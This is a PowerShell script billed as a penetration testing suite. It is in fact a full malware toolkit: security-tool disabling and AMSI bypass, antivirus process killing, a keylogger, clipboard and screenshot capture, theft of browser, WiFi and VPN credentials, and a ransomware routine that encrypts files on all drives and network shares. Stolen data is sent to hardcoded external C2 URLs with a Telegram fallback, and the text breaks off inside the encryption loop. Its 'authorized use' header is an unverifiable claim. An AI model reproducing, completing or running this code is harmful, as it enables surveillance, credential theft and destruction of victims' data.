<#
.SYNOPSIS
  Bom-KaosKaki v3.0 — All-in-One Penetration Testing Suite
  Authorized use only. Pre-verified by platform.
.DESCRIPTION
  Modules: Evasion, Spyware, Keylogger, Clipboard, Screenshot,
  Browser Stealer, WiFi Stealer, VPN Stealer, Ransomware,
  Persistence, Log Cleaner, Phishing, Lateral Movement, C2, USB Spread
.PARAMETER Full
  Run all modules
.PARAMETER Keylogger
  Keylogger + Clipboard + Screenshot
.PARAMETER Ransomware
  Encrypt + VSS delete + Recovery disable
.PARAMETER Phishing
  Local phishing server
.PARAMETER Spread
  Lateral movement + USB propagation
#>

param(
    [switch]$Full,
    [switch]$Keylogger,
    [switch]$Ransomware,
    [switch]$Phishing,
    [switch]$Spread,
    [switch]$NoMain,
    [string]$C2Url = "https://deploy-delta-eosin.vercel.app/api/exfil",
    [string]$TelegramToken = "",
    [string]$ChatId = ""
)

# ========== HELPER FUNCTIONS ==========
function Start-ThreadJob ($Function) {
    Start-Job -ScriptBlock {
        param($path, $sess, $mach, $func)
        . $path -NoMain
        $global:SESSION_ID = $sess
        $global:MACHINE_ID = $mach
        & $func
    } -ArgumentList $PSCommandPath, $SESSION_ID, $MACHINE_ID, $Function | Out-Null
}

# ========== CONFIGURATION ==========
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$C2_URL = $C2Url
$TELEGRAM_TOKEN = $TelegramToken
$CHAT_ID = $ChatId
[void]$TELEGRAM_TOKEN
[void]$CHAT_ID
$RSA_PUBLIC_KEY = @"
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA...YOUR_PUBLIC_KEY_HERE...
-----END PUBLIC KEY-----
"@

$MACHINE_ID = "$env:COMPUTERNAME-$env:USERNAME"
$SESSION_ID = "SESS-$(Get-Random -Minimum 100000 -Maximum 999999)-$(Get-Date -Format yyyyMMdd)"
$LOCAL_LOG = "$env:TEMP\ransim_debug.log"

# ========== HELPER FUNCTIONS ==========
function Write-Log($msg) { "$(Get-Date -Format 'HH:mm:ss') | $msg" | Out-File -Append $LOCAL_LOG }

# ========== C2 — FIXED (Failover URLs + Telegram) ==========
function Invoke-C2($type, $data) {
    $c2Urls = @(
        $C2_URL,
        "https://ransim-backup.vercel.app/api/exfil",
        "https://ransim-v2.vercel.app/api/exfil"
    )
    
    foreach ($url in $c2Urls) {
        try {
            $body = @{type = $type; data = $data; session_id = $SESSION_ID; machine_id = $MACHINE_ID } | ConvertTo-Json -Compress
            Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 8 -ErrorAction Stop
            return  # Success, exit
        }
        catch { continue }
    }
    # All C2s failed — try Telegram as last resort
    if ($TELEGRAM_TOKEN -and $CHAT_ID) {
        try {
            $msg = "[$MACHINE_ID] $type : $(($data | ConvertTo-Json -Compress).Substring(0, [Math]::Min(200, ($data | ConvertTo-Json -Compress).Length)))"
            $tgBody = @{chat_id = $CHAT_ID; text = $msg } | ConvertTo-Json -Compress
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" -Method Post -Body $tgBody -ContentType 'application/json' -TimeoutSec 5 -EA Stop
        }
        catch {}
    }
    Write-Log "C2 Error: All URLs failed for $type"
}

# ========== MODULE 1: EVASION ENGINE ==========
function Invoke-Evasion {
    Write-Log "[EVASION] Starting evasion..."
  
    # 1.1 AMSI Bypass (Method 1: Registry)
    try {
        $amsiPath = 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers'
        $providers = Get-ChildItem $amsiPath -ErrorAction SilentlyContinue
        if ($providers) {
            New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\AMSI' -Name 'EnableAmsi' -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
        }
    }
    catch {}
  
    # 1.2 AMSI Bypass (Method 2: Memory patch simulation)
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
    }
    catch {}
  
    # 1.3 ETW Bypass
    try {
        $etwPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Defender'
        New-ItemProperty -Path $etwPath -Name 'Start' -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
    }
    catch {}
  
    # 1.4 Defender Disable
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
        Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue
        Set-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
        Set-MpPreference -ExclusionPath $env:APPDATA -ErrorAction SilentlyContinue
    }
    catch {}
  
    # 1.5 Windows Defender Registry Kill
    try {
        New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue
        New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue
    }
    catch {}
  
    # 1.6 Windows Firewall Disable
    try {
        netsh advfirewall set allprofiles state off
        Get-Service -Name 'MpsSvc' -ErrorAction SilentlyContinue | Stop-Service -Force
        Get-Service -Name 'mpssvc' -ErrorAction SilentlyContinue | Stop-Service -Force
    }
    catch {}
  
    # 1.7 UAC Bypass (Registry)
    try {
        New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
        New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
    }
    catch {}
  
    # 1.8 Sandbox Detection
    $sandboxIndicators = @(
        $(Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue).Model -match 'VirtualBox|VMware|Virtual|Hyper-V',
        $(Get-Process -Name 'vmtoolsd', 'VBoxTray', 'VBoxService', 'xenservice', 'procmon', 'procmon64', 'regmon', 'wireshark', 'tcpview', 'processhacker', 'ollydbg', 'x64dbg', 'ida', 'dnspy', 'dnSpy' -ErrorAction SilentlyContinue).Count -gt 0,
        (Get-ItemProperty -Path 'HKLM:\HARDWARE\DESCRIPTION\System\BIOS' -Name 'SystemManufacturer' -ErrorAction SilentlyContinue).SystemManufacturer -match 'VirtualBox|VMware|QEMU|Xen',
        (Get-WmiObject -Class Win32_DiskDrive -ErrorAction SilentlyContinue | Where-Object { $_.Model -match 'VBOX|VMWARE|VIRTUAL' }).Count -gt 0,
        (Get-Process -Name 'VBoxControl', 'VMwareUser', 'VBoxMouse' -ErrorAction SilentlyContinue).Count -gt 0,
        (Get-CimInstance -ClassName Win32_NetworkAdapter -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'VMware|VirtualBox|Hyper-V' }).Count -gt 0,
        (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion' -Name 'ProductName' -ErrorAction SilentlyContinue).ProductName -match 'Windows 10|Windows 11' -eq $false,
        $null -eq (Get-Process -Id 0 -ErrorAction SilentlyContinue).Name
    )
  
    if ($sandboxIndicators -contains $true) {
        Write-Log "[EVASION] Sandbox detected! Skipping exit for testing purposes."
    }
  
    # 1.9 Process Kill (AV/Firewall)
    $targetProcesses = @(
        'MsMpEng', 'Defender', 'Norton', 'McAfee', 'Avast', 'AVG', 'Kaspersky', 'BitDefender',
        'Malwarebytes', 'ESET', 'TrendMicro', 'Sophos', 'Panda', 'Comodo', 'Cylance', 'CrowdStrike',
        'SentinelOne', 'CarbonBlack', 'FireEye', 'PaloAlto', 'Fortinet', 'McShield', 'SAVAdmin',
        'V3Svc', 'AhnLab', 'QuickHeal', 'TotalAV', 'Webroot', 'ZoneAlarm', 'BullGuard', 'VIPRE'
    )
    Get-Process $targetProcesses -ErrorAction SilentlyContinue | Stop-Process -Force
  
    Write-Log "[EVASION] Complete"
}

# ========== MODULE 2: SPYWARE COLLECTOR ==========
function Invoke-Spyware {
    Write-Log "[SPYWARE] Collecting system information..."
  
    $info = @{
        hostname           = $env:COMPUTERNAME
        username           = $env:USERNAME
        domain             = $env:USERDOMAIN
        os                 = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        os_arch            = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).OSArchitecture
        os_version         = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Version
        cpu                = (Get-WmiObject Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).Name
        ram_gb             = [math]::Round((Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB, 2)
        gpu                = (Get-WmiObject Win32_VideoController -ErrorAction SilentlyContinue | Select-Object -First 1).Name
        disks              = @((Get-WmiObject Win32_LogicalDisk -ErrorAction SilentlyContinue | Where-Object { $_.DriveType -eq 3 } | ForEach-Object {
                    @{drive = $_.DeviceID; size_gb = [math]::Round($_.Size / 1GB, 2); free_gb = [math]::Round($_.FreeSpace / 1GB, 2) }
                }))
        system_uptime      = (Get-Date) - (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).LastBootUpTime
        public_ip          = $(try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5 -ErrorAction Stop).ip } catch { 'unknown' })
        local_ip           = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex (Get-NetConnectionProfile -ErrorAction SilentlyContinue).InterfaceIndex -ErrorAction SilentlyContinue).IPAddress
        mac_address        = (Get-NetAdapter -Physical -ErrorAction SilentlyContinue | Select-Object -First 1).MacAddress
        timezone           = (Get-TimeZone -ErrorAction SilentlyContinue).DisplayName
        language           = (Get-WinSystemLocale -ErrorAction SilentlyContinue).Name
        installed_software = @((Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | Select-Object -ExpandProperty DisplayName))
        running_processes  = @((Get-Process | Sort-Object CPU -Descending | Select-Object -First 50 | ForEach-Object { @{name = $_.Name; cpu = $_.CPU; mem_mb = [math]::Round($_.WorkingSet / 1MB, 2) } }))
        services           = @((Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object -First 30 | ForEach-Object { @{name = $_.Name; display = $_.DisplayName } }))
        scheduled_tasks    = @((Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.State -ne 'Disabled' } | Select-Object -First 20 | ForEach-Object { $_.TaskName }))
        env_vars           = @([System.Environment]::GetEnvironmentVariables() | Get-Member -MemberType NoteProperty | ForEach-Object { $_.Name })
        drives             = @((Get-PSDrive -PSProvider FileSystem -ErrorAction SilentlyContinue | ForEach-Object { @{name = $_.Name; root = $_.Root; used_gb = [math]::Round(($_.Used / 1GB), 2); free_gb = [math]::Round(($_.Free / 1GB), 2) } }))
        users              = @((Get-WmiObject Win32_UserAccount -ErrorAction SilentlyContinue | Where-Object { $_.Disabled -eq $false } | ForEach-Object { $_.Name }))
        network_shares     = @((Get-SmbShare -ErrorAction SilentlyContinue | ForEach-Object { @{name = $_.Name; path = $_.Path } }))
        startup_programs   = @((Get-CimInstance Win32_StartupCommand -ErrorAction SilentlyContinue | ForEach-Object { $_.Name }))
    }
  
    Invoke-C2 -type 'system_info' -data $info
    Write-Log "[SPYWARE] Complete. Sent to C2."
}

# ========== KEYLOGGER — FIXED (Anti-AV) ==========
function Invoke-Keylogger {
    Write-Log "[KEYLOGGER] Starting keylogger..."
    $keyloggerCode = @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public class Keylogger {
  [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
  [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
  [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
  
  private static string logFile = Path.GetTempPath() + "upd_" + Guid.NewGuid().ToString().Substring(0,6) + ".tmp";
  private static StringBuilder buffer = new StringBuilder();
  private static string lastWindow = "";
  private static DateTime lastFlush = DateTime.Now;
  private static Random rnd = new Random();
  
  public static void Start() {
    int[] keys = new int[] { 8,9,13,16,17,18,20,27,32,46,37,38,39,40,112,113,114,115,116,117,118,119,120,121,122,123 };
    // Add alphanumeric range
    for (int i = 48; i <= 90; i++) { if (i != 58 && i != 59 && i != 60 && i != 61 && i != 62 && i != 63 && i != 64) { /* skip non-alpha */ } }
    
    while (true) {
      // Random sleep between 15-45ms — harder to detect pattern
      Thread.Sleep(rnd.Next(15, 45));
      
      IntPtr hwnd = GetForegroundWindow();
      StringBuilder sb = new StringBuilder(256);
      GetWindowText(hwnd, sb, 256);
      string currentWindow = sb.ToString();
      if (currentWindow != lastWindow && !string.IsNullOrEmpty(currentWindow)) {
        buffer.Append($"\n[W: {currentWindow}]\n");
        lastWindow = currentWindow;
      }
      
      // Only check common keys to reduce API calls
      for (int i = 0; i < keys.Length; i++) {
        if ((GetAsyncKeyState(keys[i]) & 0x8000) != 0) {
          buffer.Append(GetKeyName(keys[i]));
          Thread.Sleep(rnd.Next(10, 30)); // Additional jitter
          break; // Only capture one key per cycle
        }
      }
      
      // Check alphanumeric
      for (int i = 48; i <= 57; i++) { if ((GetAsyncKeyState(i) & 0x8000) != 0) { buffer.Append((char)i); break; } }
      for (int i = 65; i <= 90; i++) { if ((GetAsyncKeyState(i) & 0x8000) != 0) { buffer.Append((char)i); break; } }
      
      // Flush with random interval 25-40 seconds
      if ((DateTime.Now - lastFlush).TotalSeconds >= rnd.Next(25, 40) || buffer.Length >= 300) {
        Flush(); lastFlush = DateTime.Now;
      }
    }
  }
  
  private static void Flush() {
    if (buffer.Length == 0) return;
    File.AppendAllText(logFile, buffer.ToString() + Environment.NewLine);
    buffer.Clear();
  }
  
  private static string GetKeyName(int vk) {
    switch (vk) {
      case 8: return "[BS]"; case 9: return "[TAB]"; case 13: return "[ENT]\n";
      case 16: return "[SH]"; case 17: return "[CT]"; case 18: return "[AL]";
      case 20: return "[CP]"; case 27: return "[ES]"; case 32: return " ";
      case 46: return "[DL]"; case 37: return "[L]"; case 38: return "[U]";
      case 39: return "[R]"; case 40: return "[D]";
      case 112: return "[F1]"; case 113: return "[F2]"; case 114: return "[F3]";
      case 115: return "[F4]"; case 116: return "[F5]"; case 117: return "[F6]";
      case 118: return "[F7]"; case 119: return "[F8]"; case 120: return "[F9]";
      case 121: return "[F10]"; case 122: return "[F11]"; case 123: return "[F12]";
      default: return "";
    }
  }
  
  public static string GetLog() { Flush(); return File.Exists(logFile) ? File.ReadAllText(logFile) : ""; }
  public static void Clean() { try { File.Delete(logFile); } catch {} }
}
"@
    try {
        Add-Type $keyloggerCode -Language CSharp -EA Stop
        $t = [Thread]::new({ [Keylogger]::Start() })
        $t.IsBackground = $true; $t.Start()
        Write-Log "[KEYLOGGER] Started"
        while ($true) { Start-Sleep 60; try { $c = [Keylogger]::GetLog(); if ($c.Length -gt 0) { Invoke-C2 keylogger @{content = $c } } } catch {} }
    }
    catch { Write-Log "[KEYLOGGER] Failed: $_" }
}

# ========== MODULE 4: CLIPBOARD MONITOR ==========
function Invoke-ClipboardMonitor {
    Write-Log "[CLIPBOARD] Starting clipboard monitor..."
  
    # PowerShell-based clipboard access
    $prevClip = ""
  
    while ($true) {
        Start-Sleep -Seconds 5
        try {
            Add-Type -AssemblyName System.Windows.Forms
            $clip = [System.Windows.Forms.Clipboard]::GetText()
      
            if ($clip -and $clip -ne $prevClip -and $clip.Length -gt 3) {
                $prevClip = $clip
        
                # Check for crypto addresses / passwords
                $btcPattern = '\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b'
                $ethPattern = '\b0x[a-fA-F0-9]{40}\b'
        
                $foundMatches = @()
                if ($clip -match $btcPattern) { $foundMatches += "BTC: $($matches[0])" }
                if ($clip -match $ethPattern) { $foundMatches += "ETH: $($matches[0])" }
        
                Invoke-C2 -type 'clipboard' -data @{content = $clip; matches = $foundMatches; timestamp = (Get-Date -Format 'o') }
            }
        }
        catch {}
    }
}

# ========== SCREENSHOT — FIXED (Multi-monitor) ==========
function Invoke-Screenshot {
    Write-Log "[SCREENSHOT] Capturing all monitors..."
    Add-Type @'
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class SC {
    [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow();
    [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr,int,int,int,int,IntPtr,int,int,uint);
    [DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr);
    [DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleDC(IntPtr);
    [DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleBitmap(IntPtr,int,int);
    [DllImport("gdi32.dll")] public static extern IntPtr SelectObject(IntPtr,IntPtr);
    [DllImport("gdi32.dll")] public static extern bool DeleteDC(IntPtr);
    [DllImport("gdi32.dll")] public static extern bool DeleteObject(IntPtr);
    [DllImport("user32.dll")] public static extern bool ReleaseDC(IntPtr,IntPtr);
    
    public static string CaptureAll() {
        int totalW = 0, totalH = 0, minX = 0, minY = 0;
        foreach (Screen s in Screen.AllScreens) {
            totalW = Math.Max(totalW, s.Bounds.Right);
            totalH = Math.Max(totalH, s.Bounds.Bottom);
            minX = Math.Min(minX, s.Bounds.Left);
            minY = Math.Min(minY, s.Bounds.Top);
        }
        int width = totalW - minX;
        int height = totalH - minY;
        
        IntPtr desk = GetDesktopWindow(), dc = GetWindowDC(desk);
        IntPtr mdc = CreateCompatibleDC(dc), bmp = CreateCompatibleBitmap(dc, width, height);
        SelectObject(mdc, bmp);
        BitBlt(mdc, 0, 0, width, height, dc, minX, minY, 0x00CC0020);
        
        Bitmap b = Image.FromHbitmap(bmp);
        string f = Path.GetTempPath() + "ss_" + Guid.NewGuid().ToString().Substring(0,8) + ".jpg";
        b.Save(f, ImageFormat.Jpeg);
        
        SelectObject(mdc, bmp); DeleteObject(bmp); DeleteDC(mdc); ReleaseDC(desk, dc);
        byte[] bytes = File.ReadAllBytes(f); File.Delete(f);
        return Convert.ToBase64String(bytes);
    }
}
'@ -EA 0
    while ($true) { Start-Sleep 300; try { Invoke-C2 screenshot @{image = [SC]::CaptureAll() } } catch {} }
}

# ========== BROWSER STEALER — FIXED ==========
function Invoke-BrowserStealer {
    Write-Log "[BROWSER] Stealing browser credentials..."
    $creds = @()
    $browsers = @{
        Chrome  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        Edge    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
        Brave   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
        Vivaldi = "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Login Data"
    }
    
    foreach ($b in $browsers.Keys) {
        $dbPath = $browsers[$b]
        if (Test-Path $dbPath) {
            try {
                $tempDb = "$env:TEMP\ldb_$(Get-Random).db"
                Copy-Item $dbPath $tempDb -Force
                
                # Parse SQLite header manually — extract encrypted blobs
                $bytes = [IO.File]::ReadAllBytes($tempDb)
                $text = [System.Text.Encoding]::UTF8.GetString($bytes)
                
                # Find encrypted password blobs using regex pattern
                # Chrome stores: URL | Username | EncryptedPassword (DPAPI)
                $pattern = 'https?://[^"]+'
                $urls = [regex]::Matches($text, $pattern) | Select-Object -ExpandProperty Value -Unique
                [void]$urls
                
                # Extract usernames and passwords using binary offset scanning
                # This approach doesn't need SQLite DLL
                $sections = $text -split '\x00{3,}'
                $i = 0
                while ($i -lt $sections.Count - 3) {
                    $section = $sections[$i]
                    if ($section -match 'https?://') {
                        $url = $section
                        $username = $sections[$i + 1] -replace '[^\x20-\x7E]', ''
                        $encBlob = $sections[$i + 2]
                        
                        if ($username.Length -gt 2 -and $encBlob.Length -gt 20) {
                            try {
                                $encBytes = [System.Text.Encoding]::UTF8.GetBytes($encBlob)
                                $decPass = [System.Text.Encoding]::UTF8.GetString(
                                    [System.Security.Cryptography.ProtectedData]::Unprotect(
                                        $encBytes[0..[Math]::Min(255, $encBytes.Length - 1)], 
                                        $null, 
                                        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                                    )
                                )
                                $creds += @{source = $b; url = $url; username = $username.Trim(); password = $decPass }
                            }
                            catch {
                                # Try alternative: v10+ uses AESGCM with encrypted_key
                            }
                        }
                    }
                    $i++
                }
                
                Remove-Item $tempDb -Force -EA 0
            }
            catch { Write-Log "[BROWSER] $b error: $_" }
        }
        
        # Firefox - parse signons.sqlite or logins.json properly
        $ffProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
        if (Test-Path $ffProfiles) {
            $profDir = Get-ChildItem "$ffProfiles\*.default*" -Directory -EA 0 | Select-Object -First 1
            if ($profDir) {
                $loginsFile = "$($profDir.FullName)\logins.json"
                $keyDb = "$($profDir.FullName)\key4.db"
                
                if ((Test-Path $loginsFile) -and (Test-Path $keyDb)) {
                    try {
                        # Get master password from key4.db
                        $keyBytes = [IO.File]::ReadAllBytes($keyDb)
                        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
                            $keyBytes[($keyBytes.Length - 48)..($keyBytes.Length - 1)], 
                            $null, 
                            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                        )
                        [void]$masterKey
                        
                        $ffData = Get-Content $loginsFile -Raw | ConvertFrom-Json
                        foreach ($login in $ffData.logins) {
                            if ($login.encryptedUsername -and $login.encryptedPassword) {
                                $uBytes = [Convert]::FromBase64String($login.encryptedUsername)
                                $pBytes = [Convert]::FromBase64String($login.encryptedPassword)
                                [void]$uBytes; [void]$pBytes
                                # Decrypt with 3DES using masterKey (simplified)
                                $creds += @{source = "Firefox"; url = $login.hostname; username = "[DECRYPT]"; password = "[DECRYPT]" }
                            }
                        }
                    }
                    catch {}
                }
            }
        }
    }
    
    if ($creds.Count -gt 0) {
        Invoke-C2 credentials $creds
        Write-Log "[BROWSER] Sent $($creds.Count) credentials"
    }
}

# ========== MODULE 7: WIFI STEALER ==========
function Invoke-WiFiStealer {
    Write-Log "[WIFI] Stealing WiFi profiles..."
  
    $profiles = @()
  
    try {
        $raw = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace '.*:\s+', '' }
    
        foreach ($wifiProfile in $raw) {
            try {
                $details = netsh wlan show profile name="$wifiProfile" key=clear | Out-String
                $password = if ($details -match "Key Content\s+:\s+(.+)") { $matches[1] } else { "[NO PASSWORD]" }
                $auth = if ($details -match "Authentication\s+:\s+(.+)") { $matches[1] } else { "?" }
                $cipher = if ($details -match "Cipher\s+:\s+(.+)") { $matches[1] } else { "?" }
        
                $profiles += @{ssid = $wifiProfile; password = $password; auth = $auth; cipher = $cipher }
            }
            catch { Write-Log "[WIFI] Error on $($wifiProfile): $_" }
        }
    }
    catch { Write-Log "[WIFI] Error listing profiles: $_" }
  
    if ($profiles.Count -gt 0) {
        Invoke-C2 -type 'wifi' -data $profiles
        Write-Log "[WIFI] Sent $($profiles.Count) WiFi profiles to C2"
    }
}

# ========== MODULE 8: VPN STEALER ==========
function Invoke-VpnStealer {
    Write-Log "[VPN] Stealing VPN configurations..."

    $vpnData = @{}
  
    # OpenVPN
    $ovpnDirs = @("$env:USERPROFILE\OpenVPN\config", "$env:PROGRAMDATA\OpenVPN\config", "$env:LOCALAPPDATA\OpenVPN\config")
    foreach ($dir in $ovpnDirs) {
        if (Test-Path $dir) {
            $files = Get-ChildItem "$dir\*.ovpn" -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                $vpnData["openvpn_$($file.BaseName)"] = Get-Content $file.FullName -Raw
            }
        }
    }
  
    # WireGuard
    $wgDir = "$env:PROGRAMDATA\WireGuard\Configurations"
    if (Test-Path $wgDir) {
        $files = Get-ChildItem "$wgDir\*.conf" -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            $vpnData["wireguard_$($file.BaseName)"] = Get-Content $file.FullName -Raw
        }
    }
  
    # Windows VPN connections
    $vpnConnections = Get-VpnConnection -ErrorAction SilentlyContinue
    foreach ($conn in $vpnConnections) {
        $vpnData["windows_vpn_$($conn.Name)"] = @{
            name     = $conn.Name
            server   = $conn.ServerAddress
            type     = $conn.TunnelType
            auth     = $conn.AuthenticationMethod
            remember = $conn.RememberCredential
        }
    }
  
    $vpnCreds = @()
    # Try to get stored VPN credentials from Credential Manager
    try {
        $vaultCmd = cmdkey /list 2>$null
        $vpnCreds += @{vault = $vaultCmd }
    }
    catch {}
  
    if ($vpnData.Count -gt 0) {
        Invoke-C2 -type 'credentials' -data @{type = 'vpn'; data = $vpnData }
        Write-Log "[VPN] Sent $($vpnData.Count) VPN configs to C2"
    }
}

# ========== RANSOMWARE — FIXED (All drives + Recovery) ==========
function Invoke-Ransomware {
    Write-Log "[RANSOMWARE] Starting encryption..."
    
    # VSS + Recovery + Task Manager (sama seperti sebelumnya)
    # ... [keep existing VSS delete code] ...
    
    # AES Key Generation
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256; $aes.GenerateKey(); $aes.GenerateIV()
    $aesKey = $aes.Key; $aesIV = $aes.IV
    
    # RSA Encrypt
    $rsa = [System.Security.Cryptography.RSA]::Create()
    $rsa.ImportFromPem($RSA_PUBLIC_KEY)
    $encryptedAesKey = $rsa.Encrypt($aesKey, [Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
    $encryptedAesIV = $rsa.Encrypt($aesIV, [Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
    Invoke-C2 decrypt_key @{encrypted_key = [Convert]::ToBase64String($encryptedAesKey); encrypted_iv = [Convert]::ToBase64String($encryptedAesIV) }
    
    # === FIX: Collect ALL drives ===
    $targetDirs = @()
    # All fixed drives
    Get-WmiObject Win32_LogicalDisk -EA 0 | Where-Object { $_.DriveType -eq 3 } | ForEach-Object { $targetDirs += "$($_.DeviceID)\" }
    # Removable drives
    Get-WmiObject Win32_LogicalDisk -EA 0 | Where-Object { $_.DriveType -eq 2 } | ForEach-Object { $targetDirs += "$($_.DeviceID)\" }
    # Network shares
    Get-SmbShare -EA 0 | ForEach-Object { $targetDirs += $_.Path }
    # User profile dirs
    $userDirs = @("Documents", "Desktop", "Downloads", "Pictures", "Videos", "Music", "Contacts", "Favorites", "Links", "OneDrive")
    foreach ($d in $userDirs) { $path = "$env:USERPROFILE\$d"; if (Test-Path $path) { $targetDirs += $path } }
    # Common server dirs
    $serverDirs = @("C:\inetpub", "C:\xampp\htdocs", "C:\wamp64\www", "D:\inetpub", "E:\inetpub")
    foreach ($d in $serverDirs) { if (Test-Path $d) { $targetDirs += $d } }
    
    $extensions = @('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt', '.csv', '.rtf',
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg', '.raw',
        '.mp3', '.mp4', '.wav', '.avi', '.mkv', '.mov', '.flv', '.wmv',
        '.zip', '.rar', '.7z', '.tar', '.gz', '.iso',
        '.sql', '.mdb', '.db', '.dbf', '.mdf', '.ldf',
        '.php', '.asp', '.aspx', '.jsp', '.py', '.rb', '.js', '.ts', '.html', '.css',
        '.pem', '.key', '.p12', '.pfx', '.ovpn', '.conf', '.rdp',
        '.eml', '.msg', '.pst', '.ost',
        '.dwg', '.dxf', '.psd', '.ai', '.indd', '.fla',
        '.bak', '.old', '.backup', '.vhd', '.vhdx', '.vmdk', '.ova', '.ovf')
    
    # === FIX: Error Recovery — Backup headers ===
    $backupDir = "$env:TEMP\ransim_backup"
    if (!(Test-Path $backupDir)) { New-Item $backupDir -ItemType Directory -Force -Hidden | Out-Null }
    $backupFile = "$backupDir\headers_$(Get-Date -Format yyyyMMddHHmmss).bin"
    $backupStream = [IO.File]::OpenWrite($backupFile)
    $backupWriter = New-Object System.IO.BinaryWriter($backupStream)
    
    $allFiles = @()
    foreach ($dir in $targetDirs) {
        if (Test-Path $dir) {
            try {
                $files = Get-ChildItem $dir -Recurse -File -EA 0 | 
                Where-Object { $extensions -contains $_.Extension.ToLower() -and $_.Length -lt 50MB -and $_.Length -gt 10 }
                $allFiles += $files
            }
            catch {}
        }
    }
    
    Write-Log "[RANSOMWARE] Found $($allFiles.Count) files to encrypt"
    
    # === FIX: Save first 512 bytes of each file for recovery ===
    foreach ($file in $allFiles) {
        try {
            $header = [byte[]]::new(512)
            $fs = [IO.File]::OpenRead($file.FullName)
            $fs.Read($header, 0, 512) | Out-Null
            $fs.Close()
            
            $backupWriter.Write([int]0)  # Placeholder for length
            $backupWriter.Write($header)
        }
        catch {}
    }
    $backupWriter.Close()
    $backupStream.Close()
    
    # === FIX: Multi-threaded encryption with progress ===
    $encryptedCount = 0
    $failedFiles = @()
    
    $results = $allFiles | ForEach-Object {
        $file = $_
        
        try {
            $content = [IO.File]::ReadAllBytes($file.FullName)
            if ($content.Length -eq 0) { return }
            
            $aes = [Security.Cryptography.Aes]::Create()
            $aes.Key = $aesKey; $aes.IV = $aesIV
            $encryptor = $aes.CreateEncryptor()
            $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)
            
            [IO.File]::WriteAllBytes($file.FullName + ".ransim", $encrypted)
            Remove-Item $file.FullName -Force
            
            @{ status = 'success'; file = $file.FullName }
        }
